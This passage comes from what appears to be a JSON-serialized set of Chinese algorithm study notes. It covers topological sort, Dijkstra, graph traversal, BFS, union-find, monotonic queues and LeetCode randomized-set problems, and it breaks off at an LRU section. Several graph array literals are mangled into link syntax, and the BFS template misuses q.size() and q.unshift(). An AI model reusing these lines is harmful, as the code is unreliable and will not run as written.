存放所有入度为0的队列\n  const inDegreeZeroQueue = [];\n  const inDegreeLen = {};\n\n  for (let [key, value] of inDegreeMap.entries()) {\n    if (value.length === 0) {\n      inDegreeZeroQueue.push(key)\n    }\n    inDegreeLen[key] = value.length;\n  }\n\n  //所有入度为 0 的节点都被放入res中，它们就是可以作为拓扑排序最前面的节点，并且它们之间的相对顺序是无关紧要的，排序结果\n  const res = [];\n\n  while (inDegreeZeroQueue.length) {\n    // 1、对首出队\n    let u = inDegreeZeroQueue.shift();\n    res.push(u)\n\n    // 2、获取改点的所有出度  →  然后把它的入度 - 1\n    const outDegree = outDegreeMap.get(u);\n    console.log(outDegree);\n\n    outDegree.forEach((v) => {\n      inDegreeLen[v] -= 1;\n      if (inDegreeLen[v] === 0) {\n        inDegreeZeroQueue.push(v)\n      }\n    })\n  }\n\n  console.log(res);\n\n  return res;\n}\n\nconsole.log(sort(graph));\n```\n\n> 其实这里直接使用对象就好了，没那么麻烦！\n\n\n\n## 最短路径算法\n\n\n\n## 最小生成树\n\n### Dijkstra 算法 - 贪心算法\n\n贪心算法遵循一种近似解决问题的技术，期盼通过每个阶段的局部最优选择(当前最好的解)，从而达到全局的最优(全局最优解)。\n\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/edd2c601a2a984e6d244e7115d7e4f31.png)\n使用邻接矩阵表示：\n\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/f493ee2f74e2bcfeb1a71724d5109f54.png)\n\n- 注意看 `**A → C**` ，都是 `Col` 到 `Row` \n\n**关键步骤：**\n\n1. **首先，初始化指定的点**`**src**`**到各顶点的最小距离为**`**dist = [INF,INF,INF,....] src到src的最小距离为0；**`\n2. **定义变量**`**visted=[false,false,.....] 标识是否已经访问过改顶点**`\n3. **以**`**dist**`**中，最小值的位置为**`**源点**`**，依次去找到还没访问过的点的距离，循环遍历更新最短距离   【很重要，这就是贪心算法的体现，寻找局部最优】**\n\n以下是代码，多执行多观察几遍：应该就能理解了，可参考图：[https://leetcode.cn/problems/network-delay-time/solution/gtalgorithm-dan-yuan-zui-duan-lu-chi-tou-w3zc/](https://leetcode.cn/problems/network-delay-time/solution/gtalgorithm-dan-yuan-zui-duan-lu-chi-tou-w3zc/)\n\n```javascript\n// 二位数组\nlet graph = [\n  //    0  1  2  3  4  5\n  /* 0 */[0, 2, 4, 0, 0, 0],    //  A → C ，都是 Col 到 Row\n  /* 1 */[0, 0, 2, 4, 2, 0],\n  /* 2 */[0, 0, 0, 0, 3, 0],\n  /* 3 */[0, 0, 0, 0, 0, 2],\n  /* 4 */[0, 0, 0, 3, 0, 2],\n  /* 5 */[0, 0, 0, 0, 0, 0]\n];\n\nlet graph2 = [\n  //      0  1  2  3  4\n  /* 0 */[0, 5, 2, 6, 0],    //  A → C ，都是 Col 到 Row\n  /* 1 */[0, 0, 0, 0, 1],\n  /* 2 */[0, 0, 0, 3, 5],\n  /* 3 */[0, 0, 0, 0, 2],\n  /* 4 */[0, 0, 0, 0, 0],\n]\n\nconst INF = Number.MAX_SAFE_INTEGER;\n\nconst getMinDistanceIndexFromDist = (dist, visited) => {\n  let min = INF; // 无限大\n  let minIndex = -1;\n  for (let v = 0; v < dist.length; v++) {\n    if (visited[v] === false && dist[v] <= min) {\n      min = dist[v];\n      minIndex = v;\n    }\n  }\n  return {minIndex, min};\n\n};\n\n/**\n * @params graph 二维数组\n * @params src  代表下标\n * */\nconst dijkstra = (graph, src) => {\n  // 到所有顶点的所有距离数组\n  const dist = [];\n  // 是否已访问过\n  const visited = [];\n  // 把所有的距离(dist)初始化为无限大\n  const {length} = graph;\n  for (let i = 0; i < length; i++) {\n    dist[i] = INF;\n    visited[i] = false;\n  }\n  // 源顶点到自己的距离肯定为 0 啊\n  dist[src] = 0;\n\n  for (let i = 0; i < length - 1; i++) {\n    // 要计算顶点间的 minDistance，就要搜索 dist 数组中的最小值，返回它在数组中的索引\n    const {minIndex, min} = getMinDistanceIndexFromDist(dist, visited);\n    visited[minIndex] = true;\n    console.log(`以位置【${minIndex}】，值为【${min}】 的源点去访问更新 dist:${JSON.stringify(dist)}`)\n    for (let v = 0; v < length; v++) {\n      if (!visited[v]  // 还没访问过\n        && graph[minIndex][v] !== 0  // 当前最小值的位置作为标识，访问其他顶点，如果不为0则更新，\n        && dist[minIndex] !== INF  //   dist数组中，最小值的位置不为无穷大时\n        && dist[minIndex] + graph[minIndex][v] < dist[v]\n      ) {\n        console.log('满足更新条件', 'i:', i, 'v:', v, 'dist[minIndex]:', dist[minIndex], 'graph[minIndex][v]:', graph[minIndex][v], 'dist[v]:', dist[v]);\n        dist[v] = dist[minIndex] + graph[minIndex][v];\n      }\n\n    }\n    console.log('*******************************************************************')\n  }\n\n  return dist;\n\n};\n\nconst dist = dijkstra(graph2, 0);\nconsole.log(dist);\n\n```\n\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/4552020624cb8bf6dac0e35c95c0af90.png)\n\n\n# 图的遍历\n各种数据结构被发明出来无非就是`**为了遍历和访问**`，所以`**「遍历」**`是所有数据结构的基础。\n\n\n# 输出所有可能的路径\n\n## 题目\n看力扣第 797 题「 [所有可能路径](https://leetcode.cn/problems/all-paths-from-source-to-target/)」,\n![image.png|504](https://832-1310531898.cos.ap-beijing.myqcloud.com/3886b417d7691307389f24eb44eaef4f.png)\n![image.png|568](https://832-1310531898.cos.ap-beijing.myqcloud.com/7b3ee33913d2a43127b74ece5e54e8ce.png)\n\n\n## 分析\n以 `0` 为起点遍历图，`同时记录遍历过的路径`，当遍历到终点时将路径记录下来即可 ，既然输入的图是`无环`的，我们就不需要 `visited` 数组辅助了，直接套用图的遍历框架：\n\n\n## DFS解法\n```javascript\n/**\n * @param {number[][]} graph\n * @return {number[][]}\n */\nlet graph = [4, 3, 1], [3, 2, 4], [3], [4], [](/post/VP30teBT.html#4,-3,-1],-[3,-2,-4],-[3],-[4],-[)\n\nconst allPathsSourceTarget = function (graph) {\n    let res = [];\n    let n = graph.length;\n    /* 图的遍历框架 */\n    function traverse(graph, cur, path) {\n        path.push(cur);\n        if (cur === n - 1) {\n            res.push([...path]);\n            path.pop();\n            return;\n        }\n        for (let v of graph[cur]) {\n            traverse(graph, v, path);\n        }\n        path.pop();\n    }\n\n    traverse(graph, 0, []);\n\n    return res;\n};\n\nconsole.log(allPathsSourceTarget(graph));\n\n```\n\n## 回溯算法解法\n```javascript\n/**\n * @param {number[][]} graph\n * @return {number[][]}\n */\nlet graph = [4, 3, 1], [3, 2, 4], [3], [4], [](/post/VP30teBT.html#4,-3,-1],-[3,-2,-4],-[3],-[4],-[)\nconst allPathsSourceTarget = function (graph) {\n    let res = [];\n    let n = graph.length;\n    /* 图的遍历框架 */\n    function backtrack(graph, cur, path) {\n        // path.push(cur);\n        if (cur === n - 1) {\n            res.push([...path]);\n            return;\n        }\n        for (let v of graph[cur]) {\n            path.push(v);\n            backtrack(graph, v, path);\n            path.pop();\n        }\n    }\n    \n    backtrack(graph, 0, [0]);\n    return res;\n};\n\nconsole.log(allPathsSourceTarget(graph));\n\n```\n\n## 深度遍历\n\n![image.png|600](https://832-1310531898.cos.ap-beijing.myqcloud.com/50134014891f5dee4d35bdd9d80779bc.png)\n![image.png|536](https://832-1310531898.cos.ap-beijing.myqcloud.com/c5f57e1baa4c4188140dff78896d42bd.png)\n```javascript\nfunction dfs(graph) {\n    // 记录被遍历过的节点\n    let visited = new Array(graph.length).fill(false);\n    // 记录从起点到当前节点的路径\n    let onPath = {};\n    // 记录访问的点\n    let res = [];\n\n    /* 图遍历框架 */\n    function traverse(graph, s) {\n        console.log('进入节点：', s);\n\n        if (visited[s]) {\n            return false;\n        }\n        // 经过节点 s，标记为已遍历\n        visited[s] = true;\n        // 做选择：标记节点 s 在路径上\n        onPath[s] = true;\n        for (let v of graph[s]) {\n            traverse(graph, v);\n        }\n\n        // console.log('离开节点：', s);\n        // 撤销选择：节点 s 离开路径\n        onPath[s] = false;\n    }\n\n    traverse(graph, 0)\n}\n\nconst g = [4, 3, 1], [3, 2, 4], [3], [4], [](/post/VP30teBT.html#4,-3,-1],-[3,-2,-4],-[3],-[4],-[)\n\ndfs(g, 0);\n\n进入节点： 0\n进入节点： 4\n进入节点： 3\n进入节点： 4\n进入节点： 1\n进入节点： 3\n进入节点： 2\n进入节点： 3\n进入节点： 4\n\n```\n\n# 拓扑排序详解及运用\n先来看看力扣第 207 题「 [课程表](https://leetcode.cn/problems/course-schedule/)」：\n![image.png|576](https://832-1310531898.cos.ap-beijing.myqcloud.com/c7f78bb6f5498a3137d585140c26ed64.png)\n\n\n## 先构建图\n\n`graph[s] `是一个列表，存储着节点 `s` 所指向的节点。\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/ade4378f2781c41cb461d4bdc410c6ab.png)\n\n\n\n# BFS\n \n BFS 出现的常见场景好吧，**问题的本质就是让你在一幅「图」中找到从起点 **`**start**`** 到终点 **`**target**`** 的最近距离，这个例子听起来很枯燥，但是 BFS 算法问题其实都是在干这个事儿**\n\n## 框架\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/8bcf3f8e6da14a73ed2332e7a436ea56.png)\n\n\n## 使用JS实现\n```javascript\n\nconst BFS = function (start,target) {\n    let q = [start]; // 核心数据结构 // 将起点加入队列\n    let visited = new Set(); // 避免走回头路\n    visited.add(start);\n    let step = 0; // 记录扩散的步数\n    while (q.length > 0) {\n        let sz = q.size();\n        /* 将当前队列中的所有节点向四周扩散 */\n        for (let i = 0; i < sz; i++) {\n            let cur = q.unshift();\n            /* 划重点：这里判断是否到达终点 */\n            if (cur === target) return step;\n            /* 将 cur 的相邻节点加入队列 */\n            for (let x of cur.adj()) {\n                if (!visited.has(x)) {\n                    q.push(x);\n                    visited.add(x);\n                }\n            }\n        }\n        /* 划重点：更新步数在这里 */\n        step++;\n    }\n};\n```\n\n## 「 [二叉树的最小深度](https://leetcode.cn/problems/minimum-depth-of-binary-tree/)」\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/6656d2174a6e70f869108a874e254ccb.png)\n\n```javascript\n/**\n * Definition for a binary tree node.\n * function TreeNode(val, left, right) {\n *     this.val = (val===undefined ? 0 : val)\n *     this.left = (left===undefined ? null : left)\n *     this.right = (right===undefined ? null : right)\n * }\n */\n/**\n * @param {TreeNode} root\n * @return {number}\n */\nvar minDepth = function (root) {\n    if (root == null) {\n        return 0;\n    }\n    let q = [root];\n    // root 本身就是一层，depth 初始化为 1\n    let depth = 1;\n    while (q.length > 0) {\n        // 一定要写在这儿！\n        const sz = q.length;\n        /* 将当前队列中的所有节点向四周扩散 */\n        for (let i = 0; i < sz; i++) {\n            let cur = q.shift();\n            /* 判断是否到达终点 */\n            if (cur.left == null && cur.right == null) {\n                return depth;\n            }\n\n            /* 将 cur 的相邻节点加入队列 */\n            if (cur.left != null) {\n                q.push(cur.left);\n            }\n            if (cur.right != null) {\n                q.push(cur.right);\n            }\n        }\n        /* 这里增加步数 */\n        depth++;\n    }\n    return depth;\n};\n```\n","hCuHw4O9":"\n# 并查集原理\n\n\n\n## 目录\n<!-- toc -->\n ## 名词解释 \n\n![图片&文件](./files/20241120-11.png)\n\n- 10 个 `连通分量`\n\t- 因为它们自成一派，没有和其他节点相连\n\n![图片&文件](./files/20241120-12.png)\n\n- 图结构中的节点 `0,1,2` 之间就有了连接关系，它们三个节点共同构成了一个`连通分量`，我们可以说这三个节点是`连通`的。\n- 这个图结构中的`连通分量`的数量从 10 减少到了 8，因为连接操作将多个连通分量合并成了一个。\n\n给你输入一个图结构\n- 进行若干次`「连接操作」`\n- 可能会查询任意两个节点`是否「连通」`\n- 或者查询当前图中有`多少个「连通分量」`\n\n\n## 并查集（Union Find）结构\n\n```java\nclass UF {\n    // 初始化并查集，包含 n 个节点，时间复杂度 O(n)\n    public UF(int n);\n\n    // 连接节点 p 和节点 q，时间复杂度 O(1)\n    public void union(int p, int q);\n\n    // 查询节点 p 和节点 q 是否连通（是否在同一个连通分量内），时间复杂度 O(1)\n    public boolean connected(int p, int q);\n\n    // 查询当前的连通分量数量，时间复杂度 O(1)\n    public int count();\n}\n```\n\n## 并查集的原理\n\n并查集本质上还是**树结构的延伸**。\n\n如果我们想办法把同一个连通分量的节点都放到同一棵树中，把这棵树的**根节点作为这个连通分量的代表**，那么我们就可以高效实现上面的操作了。\n\n并查集底层其实是一片森林，这片森林由很多多叉树组成，每棵树代表一个连通分量：\n- `connected(p, q)`：\n\t- 只需要判断 `p` 和 `q` 所在的多叉树的根节点，若相同，则 `p` 和 `q` 在同一棵树中，即连通，否则不连通。\n- `count()`：\n\t- 只需要统计一下总共有多少棵树，即可得到连通分量的数量。\n- `union(p, q)`：\n\t- 只需要将 `p` 节点所在的这棵树的根节点，接入到 `q` 节点所在的这棵树的根节点下面，即可完成连接操作。\n\t- 注意这里是两棵树的合并，并不是 `p, q` 两个节点的合并。\n\t- 因为 `p, q` 一旦连通，那么他们所属的连通分量就合并成了同一个更大的连通分量。\n\n\n并查集中每个节点其实不在乎自己的子节点是谁，只在乎自己的根节点是谁，所以节点类型为\n\n```java\nclass UFNode {\n    // 节点 id 编号\n    int id;\n\n    // 指向父节点的指针\n    UFNode parent;\n}\n```\n\n对于任意一个节点，我们都可以顺着 `parent` 指针一路找到它的根节点，如下代码\n\n```java hl:16\n// 连接节点 p 和节点 q\nvoid union(UFNode p, UFNode q) {\n    // 找到节点 p 和节点 q 的根节点\n    // 将 p 所在的整棵树接到 q 所在的整棵树下面\n    return find(p).parent = find(q);\n}\n\n// 查询节点 p 和节点 q 是否连通（是否在同一个连通分量内）\nboolean connected(UFNode p, UFNode q) {\n    return find(p).id == find(q).id;\n}\n\n// 查询节点 node 的根节点，时间复杂度取决于树的高度\nUFNode find(UFNode node) {\n    while (node.parent != null) {\n        node = node.parent;\n    }\n    return node;\n}\n```\n\n\n`union` 和 `connected` 方法的时间复杂度都依赖 `find` 方法，而 `find` 方法的时间复杂度**取决于树的高度**。\n- 所以并查集算法最终的目标，就是要尽可能**降低树的高度，如果能保持树高为常数**，那么上述方法的复杂度就都是 `O(1)` 了\n\n\n\n\n","DWo9ioaQ":"\n# 前言\n\n`#算法` `#算法/数据结构算法`  `#2024/08/11`\n\n基础数据结构相关的算法，包括以下数据\n\n- 数组\n- 链表\n\t- 单链表\n\t- 双向链表\n- 队列\n\t- 单调队列\n- 栈\n\t- 单调栈\n\n","4O7uIpwG":"\n# 单调列队算法\n\n\n`#leetcode`  `#2024/08/11`  `#算法/单调列队`  `#算法/数据结构算法`   \n\n\n## 目录\n<!-- toc -->\n ## 1. 定义 \n\n**队列**中的元素全都是**单调递增（或递减）的** \n\n## 2. 用途\n\n- 它可以快速**确定滑动窗口中的最大或最小值**\n\t- **单调队列**结合**滑动窗口方法**可以在`O(1)`时间内计算当前窗口中的**最大值或最小值**\n\t- 同时保持队列先进先出的特性\n\n## 3. 单调递减队列的实现\n\n先看看 **普通的队列的标准 API**\n\n```javascript\n// 普通的队列的标准 API\nclass Queue {\n  // enqueue 操作，在队尾加入元素 n\n  push(n) {}\n\n  // dequeue 操作，删除队头元素\n  pop() {}\n}\n```\n\n**单调递减队列的标准 API**\n\n```javascript \n// 单调递减队列的标准 API\nclass MonotonicQueue {\n  // 在队尾添加元素 n\n  push(n) {}\n\n  // 返回队头元素\n  max() {}\n\n  // 删除队头元素\n  pop() {}\n}\n```\n\n下面是**具体实现**\n\n```javascript  hl:14,32,26\n// 单调递增队列的标准 API\nclass MonotonicQueue {\n  constructor() {\n    // 维护其中的元素自尾部到头部单调递增\n    this.maxq = [];\n  }\n\n  // 在队尾添加元素 item\n  // 在尾部添加一个元素 item，维护 maxq 的单调性质\n  // 将前面小于自己的元素都删\n  push(item) {\n    // 将前面小于自己的元素都删除\n    while (this.maxq.length > 0 && this.maxq[this.maxq.length - 1] < item) {\n      // 删除数组的最后一个元素\n      this.maxq.pop();\n    }\n    this.maxq.push(item);\n  }\n\n  // 返回队头元素, 即 maxq 队首元素\n  // 队头的元素肯定是最大的\n  max() {\n    return this.maxq[0];\n  }\n\n  // 删除队头元素,\n  pop(item) {\n    // 如果要删除的元素是队头元素，就删除\n    // 否则不做任何操作\n    // 想删除的队头元素 item 可能已经被「压扁」了\n    if (this.maxq[0] === item) {\n      // 删除数组的第一个元素\n      this.maxq.shift();\n    }\n  }\n}\n```\n\n### 3.1. push(item) 的逻辑\n\n关于 `push(item)` 的逻辑，可以参考下图\n\n![cos-blog-832-34-20241012|544](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240811093920.png)\n\n> [!danger]\n>  会有疑问❓，都 `pop` 删除了，那岂不是队列里没值了，不是因为每次都会 push ，长度都会`+1` ，即使把前面的元素都干掉了，长度还是持续增加\n\n### 3.2. pop(item) 的逻辑\n\n删除队首，需要传一个参数，如果它是队首元素才需要删除\n\n![cos-blog-832-34-20241012|552](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240811095429.png)\n\n## 4. LeetCode：滑动窗口最大值\n\n> 第 239 题「[滑动窗口最大值](https://leetcode.cn/problems/sliding-window-maximum)」\n\n\n### 4.1. 题目\n\n![cos-blog-832-34-20241012|560](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240811080541.png)\n\n### 4.2. 使用单调列队来解\n\n![cos-blog-832-34-20241012|552](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240811101243.png)\n\n- 解题思路\n\t- ① 初始化一个单调队列，用于维护**移动窗口**\n\t- ② 遍历数组\n\t\t- 先填满窗口，每次 `push` 时，window 都会维护一个单调递减队列\n\t\t- 填满了，每次先后移动一次，需要做以下事情\n\t\t\t- window.push(item)\n\t\t\t- res.push(window.max())\n\t\t\t- 删除对首元素，因为**需要保证 window 的长度为 k**\n\n```javascript hl:55,42\n// 单调递增队列的标准 API\nclass MonotonicQueue {\n  constructor() {\n    // 维护其中的元素自尾部到头部单调递增\n    this.maxq = [];\n  }\n  // 在队尾添加元素 item\n  // 在尾部添加一个元素 item，维护 maxq 的单调性质\n  // 将前面小于自己的元素都删\n  push(item) {\n    // 将前面小于自己的元素都删除\n    while (this.maxq.length > 0 && this.maxq[this.maxq.length - 1] < item) {\n      this.maxq.pop();\n    }\n    this.maxq.push(item);\n  }\n  // 返回队头元素, 即 maxq 队首元素\n  // 队头的元素肯定是最大的\n  max() {\n    return this.maxq[0];\n  }\n\n  // 删除队头元素\n  pop(item) {\n    // 如果要删除的元素是队头元素，就删除\n    // 否则不做任何操作\n    // 想删除的队头元素 item 可能已经被「压扁」了\n    if (this.maxq[0] === item) {\n      this.maxq.shift();\n    }\n  }\n}\n\n/**\n * @param {number[]} nums\n * @param {number} k\n * @return {number[]}\n */\nvar maxSlidingWindow = function (nums, k) {\n  // ① 初始化一个单调队列，用来维护窗口的最大值\n  // 变量 window 是一个 MonotonicQueue 类型的实例\n  let window = new MonotonicQueue();\n\n  let res = [];\n\n  // 遍历 nums\n  for (let i = 0; i < nums.length; i++) {\n    // ①  如果 i < k - 1，先填满窗口的前 k - 1\n    if (i < k - 1) {\n      window.push(nums[i]);\n    } else {\n      // ②  窗口向前滑动，加入最后一个元素\n      // 每次 push时，window 都会维护一个单调递减队列\n      window.push(nums[i]);\n      // 记录当前窗口的最大值\n      res.push(window.max());\n      // 窗口向前滑动，删除第一个元素\n      window.pop(nums[i - k + 1]);\n    }\n  }\n\n  return res;\n};\n\n```\n\n### 4.3. 复杂度分析\n\n- 时间复杂度：O(n)\n   - 主循环遍历整个数组 nums，这需要 `O(n)` 时间，其中 n 是数组的长度。\n      - 在循环中，我们执行以下操作：\n         - push(): 虽然这个操作包含一个**while循环**，看起来可能是`O(n)`\n            -  但是每个元素最多被 push 和 pop 一次。\n            -  所以整个数组，push操 作的均摊时间复杂度是`O(1)` \n         - max(): 这是一个`O(1)`操作，因为它只是返回队列的第一个元素。\n         - pop(): 这也是一个`O(1)`操作，因为它只是检查并可能删除队列的第一个元素。\n   - 综上所述，尽管有嵌套的循环，但是由于**每个元素最多被处理两次（一次入队，一次出队）**，所以总的时间复杂度是O(n)\n- 空间复杂度：O(k)\n\t- MonotonicQueue 中的 **maxq 数组在最坏情况下可能会存储 k 个元素**，其中 k 是滑动窗口的大小。\n\t- 结果`数组 res` 的大小为 `n - k + 1`，但这是必要的输出空间，通常不计入空间复杂度。\n\n","9OlVUFIC":"\n# 常数时间删除、查找数组中的任意元素\n\n\n`#算法` `#2024/08/19`  `#算法/数组`  `#算法/哈希`  \n\n\n## 目录\n<!-- toc -->\n ## 总结 \n\n如何结合哈希表和数组，使得数组的删除操作时间复杂度也变成 `O(1)` ，\n\n1. 如果想高效地，等概率地随机获取元素，就要使用数组作为底层容器。\n2. 如果要保持数组元素的**紧凑性**，可以把待删除元素换到最后，然后 `pop` 掉末尾的元素，这样时间复杂度就是 `O(1)` 了。当然，我们需要**额外的哈希表**记录值到索引的映射。\n3. 对于第二题，数组中含有「空洞」（黑名单数字），也可以利用哈希表巧妙处理**哈希映射关系**，让数组在**逻辑上是紧凑的**，方便随机取元素。\n\n下面将从两个 leetcode 示例来说明\n\n## 示例一：O(1) 时间插入、删除和获取随机元素\n### 题目\n\n> [https://leetcode.cn/problems/insert-delete-getrandom-o1/description](https://leetcode.cn/problems/insert-delete-getrandom-o1/description)\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240819072521.png)\n\n> 注意：这是一个**集合**\n\n### 分析：两个难点\n\n**1、插入，删除，获取随机元素这三个操作的时间复杂度必须都是 O(1)**。\n\n**2、`getRandom` 方法返回的元素必须等概率返回随机元素**，也就是说，如果集合里面有 `n` 个元素，每个元素被返回的概率必须是 `1/n`。\n\n### 解决思路\n\n如果我们想在 `O(1)` 的时间删除数组中的某一个元素 `val`\n- 可以先把这个元素交换到数组的尾部\n\t- 所需要需要使用哈希表 `valToIndex` 存储每个值对应的索引\n- 然后再 `pop` 掉\n\n- ① 定义两个**属性**：\n\t- 使用数组 `nums` 存储所有元素\n\t- 使用哈希表 `valToIndex` 存储每个值对应的索引\n- ② 定义方法：random 返回 0 - length 之间的随机数\n- ③ insert(val)\n\t- 根据哈希表判断是否存在插入的元素 `val`\n\t\t- 存在，直接返回 `false`\n\t\t- 不存在\n\t\t\t- `nums.push`\n\t\t\t- 更新 `valToIndex`\n\t\t\t- 返回 `true`\n- ④ remove(val)\n\t- 如果 val 不存在，则返回 false\n\t\t- 存在\n\t\t\t- 根据 `valToIndex` 拿到当前元素所在的 `index`\n\t\t\t- 把最后一个元素放到 index\n\t\t\t- nums.pop\n\t\t\t- delete `valToIndex[val]`\n\t\t\t- 返回 true\n- ⑤ getRandom()\n\n### 代码\n\n```javascript\nvar RandomizedSet = function () {\n  // 存储所有的元素,使用数组来模拟集合\n  this.nums = [];\n  // key 是 val，value 是 val 在 nums 数组中的索引\n  this.valToIndex = {};\n\n  this.random = function () {\n    return Math.floor(Math.random() * this.nums.length);\n  };\n};\n\n/**\n * @param {number} val\n * @return {boolean}\n */\nRandomizedSet.prototype.insert = function (val) {\n  // 如果 val 已经存在，则返回 false\n  if (this.valToIndex.hasOwnProperty(val)) {\n    return false;\n  }\n  // 否则，将 val 放入 nums 数组中\n  this.nums.push(val);\n  // 并且更新 valToIndex 对象\n  this.valToIndex[val] = this.nums.length - 1;\n  return true;\n};\n\n/**\n * @param {number} val\n * @return {boolean}\n */\nRandomizedSet.prototype.remove = function (val) {\n  // 如果 val 不存在，则返回 false\n  if (!this.valToIndex.hasOwnProperty(val)) {\n    return false;\n  }\n  // 否则，将 val 从 nums 数组中删除\n  // ① 获取 val 在 nums 数组中的索引\n  let index = this.valToIndex[val];\n  // ② 将 nums 数组中最后一个元素放到 index 位置\n  this.nums[index] = this.nums[this.nums.length - 1];\n  // ③ 更新 valToIndex 对象\n  this.valToIndex[this.nums[index]] = index;\n  // ④ 删除 nums 数组中的最后一个元素\n  this.nums.pop();\n  // ⑤ 再删除 valToIndex 对象中的 val\n  delete this.valToIndex[val];\n  return true;\n};\n\n/**\n * @return {number}\n */\nRandomizedSet.prototype.getRandom = function () {\n  return this.nums[this.random()];\n};\n\n/**\n * Your RandomizedSet object will be instantiated and called as such:\n * var obj = new RandomizedSet()\n * var param_1 = obj.insert(val)\n * var param_2 = obj.remove(val)\n * var param_3 = obj.getRandom()\n */\n\n```\n\n### 注意点\n\n- 手写随机数\n- 记得更新 `valToIndex`\n\n## 示例二：[黑名单中的随机数](https://leetcode.cn/problems/random-pick-with-blacklist)\n\n### 题目\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240819080004.png)\n\n### 题意解读\n\n- 给你输入一个正整数 `N`，代表左闭右开区间 `[0,N)`\n- 再给你输入一个**黑名单数组** `blacklist`，且 `blacklist` 中的数字都是区间 `[0,N)` 中的数字\n- 要求：在区间 `[0,N)` 中「等概率随机」返回一个「不在 `blacklist` 中」的整数\n\n```javascript\n// 构造函数，输入参数\nvar Solution = function(N, blacklist) {\n    this.N = N;\n    this.blacklist = blacklist;\n};\n\n// 在区间 [0,N) 中等概率随机选取一个元素并返回\n// 这个元素不能是 blacklist 中的元素\nSolution.prototype.pick = function() {\n\n};\n```\n\n> [!danger]\n> `pick 方法`应该尽量少调用**随机数生成函数**\n\n### 解题思路\n\n- 我们可以将区间 `[0,N)` 看做一个**数组**\n- 然后将 `blacklist` 中的元素移到**数组的最末尾**\n\t- 同时用一个**哈希表 mapping**进行映射，借助哈希表操作来模拟**把黑名单数字移到数组末尾**的效果\n\t\t- `key` 为 黑名单中的一个元素\n\t\t- `value` 为 黑名单元素在区间 `[0,N)`的索引\n\n#### 场景一：黑名单都在左边\n\n分割线：`sz = N - blanklist.length = 3`\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240819230918.png)\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240819222609.png)\n\n- ① 从尾部开始计数\n- ② 遍历黑名单数组\n- ③ 两个操作\n\t- 更新哈希表\n\t\t- key 为 黑名单的 item\n\t\t- value 为 尾部索引\n\t- 计数 `last--`\n\n- 最终  mapping ，如下图\n\t-  0  -> 4\n\t-  1  -> 3 \n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240819230529.png)\n\n所以这时候就相等于从`sz`的左边，取随机值，即 `random( 0, 1,  2)`\n- 为 0 时，返回 4 ，不返回 0 ，因为 0 -> 4\n- 为 1 时，返回 3 ，不返回 1 ，因为  1 -> 3\n- 为 2 时，返回 2 \n\n代码如下：\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240819231025.png)\n\n#### 场景二：黑名单在 `sz` 两边都有\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240819231103.png)\n\n如下代码：\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240819225628.png)\n\n- 上面代码解释如下：\n\t- ①  如果 `blacklist` 中的黑名单数字本身就存在区间 `[sz, N)` 中，那么就没必要在 `mapping` 中建立映射\n\t\t- 比如上图中，`4` 就没必要建立索引\n\t- ②  在对 `mapping[b]` 赋值时，要保证 `last` 一定不在 `blacklist` 中\n\t\t- 比如上面，`4` 在黑名单中，last--，这时候 b 为 1 ，  last 为 3\n\t\t\t- 所有 1 -> 3 \n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240819231952.png)\n\n- 最终，如上图，mapping 为\n\t-  1 ->  3\n\n所以这时候就相等于从`sz`的左边，取随机值，即 `random( 0, 1,  2)`\n- 为 0 时，返回 0\n- **为 1 时，返回  3** ，不返回 1，因为 1 -> 3\n- 为 2 时，返回 2 \n\n### 最终代码\n\n```javascript\n/**  \n * @description 黑名单中的随机数  \n * @param {number} n  \n * @param {number[]} blacklist  \n */  \nvar Solution = function (N, blacklist) {  \n    // 最终数组中的元素个数  \n    this.sz = N - blacklist.length;  \n    // 黑名单中的索引  \n    this.blackIndexMap = new Map();  \n    // 转化成集合，方便快速查询  \n    let blackSet = new Set(blacklist);  \n    // 最后一个元素的索引  \n    let last = N - 1;  \n    // 将黑名单中的索引换到最后去  \n    for (let b of blacklist) {  \n        // 场景 ①：如果 b 已经在区间 [sz, N) 中，则直接跳过  \n        if(b >= this.sz) {  \n            continue;  \n        }  \n        // 跳过所有黑名单中的数字  \n        // while (blacklist.includes(last)) {  \n        while (blackSet.has(last)) {  \n            last--;  \n        }  \n        this.blackIndexMap.set(b, last);  \n        last--;  \n    }  \n};  \n  \n// 后文实现  \nSolution.prototype.pick = function () {  \n    let index = Math.floor(Math.random() * this.sz);  \n    // 如果 index 在黑名单中，则返回黑名单中的索引  \n    if (this.blackIndexMap.has(index)) {  \n        return this.blackIndexMap.get(index);  \n    }  \n    // 如果 index 不在黑名单中，则直接返回  \n    return index;  \n};\n```\n\n## 参考\n\n- https://labuladong.online/algo/data-structure/random-set/\n\n","cQAIHb4U":"\n# LRU 算法\n\n\nLRU 缓存淘汰算法就是一种常用策略。LRU 的全称是 Least Recently Used\n\n| LeetCode                                                   | 力扣                                                     | 难度  |\n| ---------------------------------------------------------- | ------------------------------------------------------ | --- |\n| 